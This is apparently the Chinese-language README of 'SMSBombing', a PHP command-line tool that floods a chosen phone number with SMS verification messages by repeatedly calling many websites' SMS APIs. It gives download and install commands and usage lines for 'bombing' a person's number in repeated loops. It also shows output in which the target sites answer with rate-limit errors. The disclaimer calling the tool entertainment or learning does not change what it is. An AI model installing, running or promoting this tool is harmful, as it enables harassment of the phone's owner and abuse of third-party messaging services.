<div align="center">
    
<h1>SMSBombing</h1>

[![Auth](https://img.shields.io/badge/Auth-xiaoxuan6-ff69b4?logo=github)](https://github.com/xiaoxuan6)
[![GitHub Pull Requests](https://img.shields.io/github/stars/xiaoxuan6/SMSBombing?logo=Undertale)](https://github.com/xiaoxuan6/SMSBombing/stargazers)
![GitHub forks](https://img.shields.io/github/forks/xiaoxuan6/SMSBombing?style=flat&logo=forgejo)
[![Github latest release](https://img.shields.io/github/v/release/xiaoxuan6/SMSBombing)](https://github.com/xiaoxuan6/SMSBombing/releases)
![GitHub Tag](https://img.shields.io/github/v/tag/xiaoxuan6/SMSBombing)
[![HitCount](https://views.whatilearened.today/views/github/xiaoxuan6/SMSBombing.svg)](https://github.com/xiaoxuan6/SMSBombing)
[![](https://img.shields.io/badge/%E5%8D%9A%E5%AE%A2-xiaoxuan6‘s-d7b1bf?logo=Blogger)](https://xiaoxuan6.vercel.app/)
![Static Badge](https://img.shields.io/badge/weekly-%E5%91%A8%E5%88%8A-d7b1bf?style=flat&logo=stackexchange)
[![GitHub license](https://img.shields.io/github/license/xiaoxuan6/SMSBombing)](https://github.com/xiaoxuan6/SMSBombing/blob/v2/LICENSE)

</div>

> [!NOTE]  
> 基础框架已提供，如需添加/修改更多 `api` 接口，直接修改 `api.json` 文件，切勿重复提交相关 issue [#14](https://github.com/xiaoxuan6/SMSBombing/issues/14)、[#11](https://github.com/xiaoxuan6/SMSBombing/issues/11)、[#10](https://github.com/xiaoxuan6/SMSBombing/issues/10)

> [!WARNING]
> 版本 `v2.1.0` 之后默认使用 `url` 获取 `api.json`, 如果需要使用指定 `api.json` 请使用版本 `v2.1.1` 或更高版本。
>
> EX:
>
> ```
> sms-bombing 176xxxxxxxx -f ./api.json
> ```

# Requirement

* PHP >= 8.1

# Install

> [!NOTE]  
> 以下三种方法使用任意一种方法安装都可以，并不是三种方法全部执行！！！
> 
> 以下三种方法使用任意一种方法安装都可以，并不是三种方法全部执行！！！
> 
> 以下三种方法使用任意一种方法安装都可以，并不是三种方法全部执行！！！
> 
> 重要的事情说三遍。

## 方法一、直接下载 [sms-bombing](./builds/sms-bombing) 可执行文件

```shell
curl 'https://mirror.ghproxy.com/https://raw.githubusercontent.com/xiaoxuan6/SMSBombing/v2/builds/sms-bombing' -o sms-bombing --progress-bar
chmod +x sms-bombing

# linux 下执行
mv sms-bombing /usr/local/bin/sms-bombing

# win 下使用 ./smsbombing ，否则报错：command not found
```

## 方法二、通过 Composer 安装

```bash
composer global require james.xue/sms-bombing
```

## 方法三、Docker

[sms-bombing](./README-docker.md)

# Use

普通轰炸（默认 10 次）

```bash
sms-bombing 136xxxxxxxx
```

全量轰炸

```bash
sms-bombing 136xxxxxxxx --num=all
```

启动 5 次,轰炸一个人的手机号(136xxxxxx)

```bash
sms-bombing 136xxxxxxxx --num=5
```

启动 5 次,轰炸一个人的手机号(136xxxxxx), 启动循环轰炸, 轮番轰炸2次

```bash
sms-bombing 136xxxxxxxx --num=5 -l 2
```

启动 5 次,轰炸一个人的手机号(136xxxxxx), 启动循环轰炸, 轮番轰炸2次，循环间隔30秒

```bash
sms-bombing 136xxxxxxxx --num=5 -l 2 -i 30
```

<details>
<summary><b>轰炸效果</b></summary>

```bash
sms-bombing 136xxxxxxxx -l 2
索引：3 请求结果：{"resultCode": 2009, "message": "phone_format_error", "data": null, "redirectUrl": null}
索引：4 请求结果：{"code":"3","codeInfo":" permission deny"}
索引：0 请求结果：{"code":65,"desc":"访问太频繁"}
索引：2 请求结果：{"success":false,"msg":"操作过于频繁，请稍后再试","data":[]}
索引：1 请求结果：
索引：7 请求结果：0
索引：6 请求结果：success
索引：8 请求结果：
索引：9 请求结果：1
索引：5 请求结果：{"code":0,"msg":"success"}
索引：0 请求结果：{"code":65,"desc":"访问太频繁"}
索引：4 请求结果：{"code":"3","codeInfo":" permission deny"}
索引：3 请求结果：{"resultCode": 2009, "message": "phone_format_error", "data": null, "redirectUrl": null}
索引：1 请求结果：
索引：2 请求结果：{"success":false,"msg":"操作过于频繁，请稍后再试","data":[]}
索引：7 请求结果：0
索引：6 请求结果：success
索引：5 请求结果：{"code":2701,"msg":"\u89e6\u53d1\u5206\u949f\u7ea7\u6d41\u63a7Permits:1"}
索引：9 请求结果：1
索引：8 请求结果：
索引：4 请求结果：{"code":"3","codeInfo":" permission deny"}
索引：0 请求结果：{"code":65,"desc":"访问太频繁"}
索引：3 请求结果：{"resultCode": 2009, "message": "phone_format_error", "data": null, "redirectUrl": null}
索引：1 请求结果：
索引：2 请求结果：{"success":false,"msg":"操作过于频繁，请稍后再试","data":[]}
索引：6 请求结果：success
索引：7 请求结果：0
索引：5 请求结果：{"code":2701,"msg":"\u89e6\u53d1\u5206\u949f\u7ea7\u6d41\u63a7Permits:1"}
索引：9 请求结果：1
```

</details>

# Changelog

Please see [CHANGELOG](./CHANGELOG.md) for more information on what has changed recently.

# 捐赠

如果此项目对您有帮助，还希望您捐赠支持，让我能好好的一直坚持下去。金额不在于多少，一份心意就好！在此感谢所有的捐赠者，你们的鼓励是我最大的动力！

<div style="background:#e3e3e3; color:#FFF" align=center >
<img width="220" height="300" src="https://cdn.jsdelivr.net/gh/xiaoxuan6/static/images/202212102216540.png"/>&nbsp;&nbsp;&nbsp;&nbsp;<img width="200" height="300" src="https://cdn.jsdelivr.net/gh/xiaoxuan6/static/images/202212102216435.jpg"/></div>

# Stargazers over time
[![Stargazers over time](https://starchart.cc/xiaoxuan6/SMSBombing.svg?variant=adaptive)](https://starchart.cc/xiaoxuan6/SMSBombing)

# License

The MIT License (MIT). Please see [License File](./LICENSE) for more information.

# 免责声明

1、若使用者滥用本项目,本人 无需承担 任何法律责任. 本程序仅供娱乐,源码全部开源,禁止滥用 和二次 贩卖盈利. 禁止用于商业用途.

2、本项目仅做学习使用，如果使用到您的网站，您不满意，请联系我删除。
